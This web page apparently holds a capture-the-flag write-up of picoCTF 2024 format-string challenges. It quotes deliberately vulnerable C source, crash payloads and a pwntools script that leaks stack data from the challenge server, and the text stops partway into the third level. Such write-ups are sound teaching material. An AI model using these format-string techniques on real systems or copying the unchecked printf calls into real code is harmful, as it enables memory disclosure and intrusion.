@@ -1,0 +1,354 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="This writeup will go over all the format string challenges that were included in the picoctf competition of 2024. I will provide a manual and automated solve for each level and try to give an in-depth">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Format Strings">
+<meta property="og:url" content="http://anthony-js.info/blog/format-string/">
+<meta property="og:site_name" content="anthonyjs">
+<meta property="og:description" content="This writeup will go over all the format string challenges that were included in the picoctf competition of 2024. I will provide a manual and automated solve for each level and try to give an in-depth">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2024-09-21T23:58:54.417Z">
+<meta property="article:modified_time" content="2024-09-22T01:25:22.547Z">
+<meta property="article:author" content="anthonyjs">
+<meta name="twitter:card" content="summary">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Format Strings</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a target="_blank" rel="noopener" href="https://github.com/AnthonyMarrongelli/">Projects</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/blog/forking-buffer/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/blog/numbersss-pwn/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://anthony-js.info/blog/format-string/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://anthony-js.info/blog/format-string/&text=Format Strings"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://anthony-js.info/blog/format-string/&title=Format Strings"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://anthony-js.info/blog/format-string/&is_video=false&description=Format Strings"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Format Strings&body=Check out this article: http://anthony-js.info/blog/format-string/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://anthony-js.info/blog/format-string/&title=Format Strings"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://anthony-js.info/blog/format-string/&title=Format Strings"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://anthony-js.info/blog/format-string/&title=Format Strings"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://anthony-js.info/blog/format-string/&title=Format Strings"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://anthony-js.info/blog/format-string/&name=Format Strings&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://anthony-js.info/blog/format-string/&t=Format Strings"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Format-String-0"><span class="toc-number">1.</span> <span class="toc-text">Format String 0</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Format-String-1"><span class="toc-number">2.</span> <span class="toc-text">Format String 1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Format-String-2"><span class="toc-number">3.</span> <span class="toc-text">Format String 2</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Manual-Solve"><span class="toc-number"></span> <span class="toc-text">Manual Solve</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Automated-Solve"><span class="toc-number"></span> <span class="toc-text">Automated Solve</span></a>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Format Strings
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">anthonyjs</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2024-09-21T23:58:54.417Z" class="dt-published" itemprop="datePublished">2024-09-21</time>
+        
+      
+    </div>
+
+
+      
+
+      
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>This writeup will go over all the format string challenges that were included in the picoctf competition of 2024. I will provide a manual and automated solve for each level and try to give an in-depth explanation.</p>
+<p>Thankfully, for all the challenges source code is provided. This will make it easier to focus on what the actual exploitation is.</p>
+<h2 id="Format-String-0"><a href="#Format-String-0" class="headerlink" title="Format String 0"></a>Format String 0</h2><p>Jumping into the source code lets checkout what our win condition will be:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">sigsegv_handler</span><span class="params">(<span class="type">int</span> sig)</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n%s\n&quot;</span>, flag);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Okay so we know that in order to get the flag printed, we need to get the program to segfault. Let’s check out main.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> **argv)</span>&#123;</span><br><span class="line">    FILE *f = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (f == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s %s&quot;</span>, <span class="string">&quot;Please create &#x27;flag.txt&#x27; in this directory with your&quot;</span>,</span><br><span class="line">                        <span class="string">&quot;own debugging flag.\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fgets(flag, FLAGSIZE, f);</span><br><span class="line">    signal(SIGSEGV, sigsegv_handler);</span><br><span class="line"></span><br><span class="line">    <span class="type">gid_t</span> gid = getegid();</span><br><span class="line">    setresgid(gid, gid, gid);</span><br><span class="line"></span><br><span class="line">    serve_patrick();</span><br><span class="line">  </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>So for the most part here we can see that the program is essentially setting up and reading in the flag. After that it’s calling <code>serve_patrick</code>.</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">serve_patrick</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s %s\n%s\n%s %s\n%s&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Welcome to our newly-opened burger place Pico &#x27;n Patty!&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Can you help the picky customers find their favorite burger?&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Here comes the first customer Patrick who wants a giant bite.&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Please choose from the following burgers:&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Enter your recommendation: &quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> choice1[BUFSIZE];</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, choice1);</span><br><span class="line">    <span class="type">char</span> *menu1[<span class="number">3</span>] = &#123;<span class="string">&quot;Breakf@st_Burger&quot;</span>, <span class="string">&quot;Gr%114d_Cheese&quot;</span>, <span class="string">&quot;Bac0n_D3luxe&quot;</span>&#125;;</span><br><span class="line">    <span class="keyword">if</span> (!on_menu(choice1, menu1, <span class="number">3</span>)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, <span class="string">&quot;There is no such burger yet!\n&quot;</span>);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">int</span> count = <span class="built_in">printf</span>(choice1);</span><br><span class="line">        <span class="keyword">if</span> (count &gt; <span class="number">2</span> * BUFSIZE) &#123;</span><br><span class="line">            serve_bob();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s\n%s\n&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;Patrick is still hungry!&quot;</span>,</span><br><span class="line">                    <span class="string">&quot;Try to serve him something of larger size!&quot;</span>);</span><br><span class="line">            fflush(<span class="built_in">stdout</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>So after checking this function out we can see that our goal here is to reach <code>serve_bob</code>. In order to do that we need to get printf to print out more than <code>2 * BUFSIZE</code> characters. In the code we can see that BUFSIZE is equal to 32. Now obviously none of the options inside of the menu that we can choose has a length greater than 64. But we can also see here that since printf is succeptible to a format string injection, when attempting to <code>printf(&quot;Gr%114d_Cheese&quot;)</code>, it actually tries to print out an integer with the width of 114. This is because the <code>%d</code> identifier, when not given a argument inside of printf, will reach for a pointer of the stack and print that out in the format we specified.</p>
+<p>Let’s check this out in the program:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Welcome to our newly-opened burger place Pico &#x27;n Patty! Can you help the picky customers find their favorite burger?</span><br><span class="line">Here comes the first customer Patrick who wants a giant bite.</span><br><span class="line">Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe</span><br><span class="line">Enter your recommendation: Gr%114d_Cheese</span><br><span class="line">Gr                                                                                                           4202954_Cheese  </span><br><span class="line">Good job! Patrick is happy! Now can you serve the second customer?</span><br><span class="line">Sponge Bob wants something outrageous that would break the shop (better be served quick before the shop owner kicks you out!)</span><br><span class="line">Please choose from the following burgers: Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak</span><br><span class="line">Enter your recommendation:</span><br></pre></td></tr></table></figure>
+
+<p>Here you can see that the program printed out that pointer it could reach, and it printed with padding in order to reach that 114 byte width.</p>
+<p>Now an important thing to see here is that in our next options, we have a option that uses the <code>%s</code> format specifier. If this is chosen without an argument given in printf, like it is in this program, we can very easy cause the program to crash if it tries to dereference something it cannot. For example, if the second pointer it reaches on the stack is <code>NULL</code>, dereferencing a null ptr will cause the program to crash, giving us our flag.</p>
+<p>Here’s that code segment that shows printf without any arguments:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> choice2[BUFSIZE];</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, choice2);</span><br><span class="line"><span class="type">char</span> *menu2[<span class="number">3</span>] = &#123;<span class="string">&quot;Pe%to_Portobello&quot;</span>, <span class="string">&quot;$outhwest_Burger&quot;</span>, <span class="string">&quot;Cla%sic_Che%s%steak&quot;</span>&#125;;</span><br><span class="line"><span class="keyword">if</span> (!on_menu(choice2, menu2, <span class="number">3</span>)) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, <span class="string">&quot;There is no such burger yet!\n&quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(choice2);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>So let’s send that into the program and see what we get.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Sponge Bob wants something outrageous that would break the shop (better be served quick before the shop owner kicks you out!)</span><br><span class="line">Please choose from the following burgers: Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak</span><br><span class="line">Enter your recommendation: Cla%sic_Che%s%steak</span><br><span class="line">ClaCla%sic_Che%s%steakic_Che(null)</span><br><span class="line">picoCTF&#123;7h3_cu570m3r_15_n3v3r_SEGFAULT_dc0f36c4&#125;</span><br></pre></td></tr></table></figure>
+
+<p>There we can see that we have successfully gotten the program to segmentation fault and retrieved our flag.</p>
+<h2 id="Format-String-1"><a href="#Format-String-1" class="headerlink" title="Format String 1"></a>Format String 1</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">1024</span>];</span><br><span class="line">  <span class="type">char</span> secret1[<span class="number">64</span>];</span><br><span class="line">  <span class="type">char</span> flag[<span class="number">64</span>];</span><br><span class="line">  <span class="type">char</span> secret2[<span class="number">64</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Read in first secret menu item</span></span><br><span class="line">  FILE *fd = fopen(<span class="string">&quot;secret-menu-item-1.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (fd == <span class="literal">NULL</span>)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&#x27;secret-menu-item-1.txt&#x27; file not found, aborting.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(secret1, <span class="number">64</span>, fd);</span><br><span class="line">  <span class="comment">// Read in the flag</span></span><br><span class="line">  fd = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (fd == <span class="literal">NULL</span>)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&#x27;flag.txt&#x27; file not found, aborting.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(flag, <span class="number">64</span>, fd);</span><br><span class="line">  <span class="comment">// Read in second secret menu item</span></span><br><span class="line">  fd = fopen(<span class="string">&quot;secret-menu-item-2.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (fd == <span class="literal">NULL</span>)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&#x27;secret-menu-item-2.txt&#x27; file not found, aborting.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  fgets(secret2, <span class="number">64</span>, fd);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Give me your order and I&#x27;ll read it back to you:\n&quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%1024s&quot;</span>, buf);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Here&#x27;s your order: &quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(buf);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Bye!\n&quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>Okay, after reading through this source code theres two important things that you need to know. The flag is being read in and stored on the stack at the beginning of the function:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> flag[<span class="number">64</span>];</span><br><span class="line">...</span><br><span class="line">fd = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (fd == <span class="literal">NULL</span>)&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&#x27;flag.txt&#x27; file not found, aborting.\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">fgets(flag, <span class="number">64</span>, fd);</span><br></pre></td></tr></table></figure>
+
+<p>This is important because with printf we can leak values off of the stack. The other thing to notice is that we have a vulnerable printf:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%1024s&quot;</span>, buf);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Here&#x27;s your order: &quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(buf);</span><br></pre></td></tr></table></figure>
+
+<p>So knowing that, there is a few ways we can approach leaking the flag off of the stack. We can use a number of different specifiers to achieve this. I will be using <code>%p</code>. The way that works is that it will print out the value that it reached as if it was a pointer, for example: <code>0x7fff31432100</code>. Another thing thats cool is that we can use positional arguments with this specifier. We can say <code>%10$p</code> to reach the 10th index of the pointers it can reach. This would be the same as writing 10 <code>%p</code>s into the program, except we aren’t also getting the 1-9 pointers.</p>
+<p>I have scripted the insertion of this position argument to iterate through the first 100 pointers to see if we can leak the flag.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;error&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    p = remote(<span class="string">&#x27;mimas.picoctf.net&#x27;</span>, <span class="number">61533</span>)</span><br><span class="line">    p.sendline(<span class="string">&#x27;%&#123;&#125;$p&#x27;</span>.<span class="built_in">format</span>(i).encode())</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    res = p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop=<span class="literal">True</span>)</span><br><span class="line">    <span class="built_in">print</span>(res)</span><br><span class="line">    p.close()</span><br></pre></td></tr></table></figure>
+
+<p>So here we set up a connection using pwntools and retrieve the pointers from 1-100. After getting the pointers, everything that was reachable on the stack is printed out in hex. We will look for something that looks like <code>pico</code>, or <code>0x6f636970</code> in little endian hex.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">b&quot;Here&#x27;s your order: (nil)&quot;</span><br><span class="line">b&quot;Here&#x27;s your order: 0x7b4654436f636970&quot;</span><br><span class="line">b&quot;Here&#x27;s your order: 0x355f31346d316e34&quot;</span><br><span class="line">b&quot;Here&#x27;s your order: 0x3478345f33317937&quot;</span><br><span class="line">b&quot;Here&#x27;s your order: 0x35625f673431665f&quot;</span><br><span class="line">b&quot;Here&#x27;s your order: 0x7d663839623764&quot;</span><br><span class="line">b&quot;Here&#x27;s your order: 0x7&quot;</span><br><span class="line">b&quot;Here&#x27;s your order: 0x738c3d56d8d8&quot;</span><br></pre></td></tr></table></figure>
+
+<p>In this segment here we can see that little endian ‘pico’ at the right side of the first big pointer we see. Extracing these and decoding from hex as well as swapping the endianness, we get <code>picoCTF&#123;4n1m41_57y13_4x4_f14g_b5d7b98f&#125;</code>.</p>
+<h2 id="Format-String-2"><a href="#Format-String-2" class="headerlink" title="Format String 2"></a>Format String 2</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> sus = <span class="number">0x21737573</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">1024</span>];</span><br><span class="line">  <span class="type">char</span> flag[<span class="number">64</span>];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;You don&#x27;t have what it takes. Only a true wizard could change my suspicions. What do you have to say?\n&quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="built_in">scanf</span>(<span class="string">&quot;%1024s&quot;</span>, buf);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Here&#x27;s your input: &quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(buf);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (sus == <span class="number">0x67616c66</span>) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;I have NO clue how you did that, you must be a wizard. Here you go...\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read in the flag</span></span><br><span class="line">    FILE *fd = fopen(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    fgets(flag, <span class="number">64</span>, fd);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, flag);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;sus = 0x%x\n&quot;</span>, sus);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You can do better!\n&quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>This challenge ramps up the difficulty a little more, but the same concepts apply. After the last challenge we discovered that we can read some values off the stack, and if you were paying attention when doing it you might’ve noticed that our input is also stored onto the stack, which will be important later.</p>
+<p>So the win condition of this challenge is that we need <code>sus</code> to be equal to <code>0x67616c66</code>, which we can see it obviously isnt. We need to change that. You might be asking how, but let me set up explain some important things first.</p>
